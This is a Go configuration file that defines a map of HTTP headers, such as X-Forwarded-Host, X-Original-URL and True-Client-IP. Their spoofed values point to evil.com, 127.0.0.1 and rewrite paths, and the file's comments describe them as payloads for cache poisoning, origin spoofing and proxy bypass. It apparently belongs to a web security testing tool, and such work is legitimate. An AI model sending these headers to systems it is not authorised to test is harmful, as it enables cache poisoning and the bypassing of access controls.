package config

// PayloadHeaders is a curated list of headers used for cache poisoning, origin spoofing, and proxy bypass attempts.
// These are typically used to manipulate CDN, proxy, and cache behavior.
var PayloadHeaders = map[string]string{
	"X-Forwarded-Host":          "evil.com",
	"X-Original-URL":            "/evilpath",
	"X-Forwarded-For":           "127.0.0.1",
	"X-Host":                    "evil.com",
	"X-Custom-IP-Authorization": "127.0.0.1",
	"X-Forwarded-Proto":         "https",
	"X-Forwarded-Port":          "443",
	"X-Rewrite-URL":             "/evilpath",
	"X-Original-Host":           "evil.com",
	"X-ProxyUser-Ip":            "127.0.0.1",
	"X-Forwarded-Server":        "evil.com",
	"X-Url-Scheme":              "https",
	"X-Requested-With":          "XMLHttpRequest",
	"X-Host-Override":           "evil.com",
	"X-Forwarded-Host-Override": "evil.com",
	"X-Forwarded-Scheme":        "https",
	"X-Client-IP":               "127.0.0.1",
	"Forwarded":                 "for=127.0.0.1;host=evil.com;proto=https",
	"X-HTTP-Method-Override":    "POST",

	// Additional cache & proxy evasion headers
	"X-Remote-IP":          "127.0.0.1",
	"X-Remote-Addr":        "127.0.0.1",
	"X-Originating-IP":     "127.0.0.1",
	"True-Client-IP":       "127.0.0.1",
	"Fastly-Client-IP":     "127.0.0.1",
	"CF-Connecting_IP":     "127.0.0.1",
	"X-Real-IP":            "127.0.0.1",
	"X-WAP-Profile":        "http://evil.com/evil.xml",
	"X-ATT-DeviceId":       "GT-P7320/Evil",
	"Device-Stock-UA":      "EvilUserAgent",
	"Save-Data":            "on",
	"X-HTTP-Host-Override": "evil.com",
	"Forwarded-For":        "127.0.0.1",
	"Via":                  "evil.com",

	// Exotic & CDN/Proxy-specific
	"X-Original-Remote-Addr": "127.0.0.1",
	"X-Forwarded":            "127.0.0.1",
	"Forwarded-For-IP":       "127.0.0.1",
}
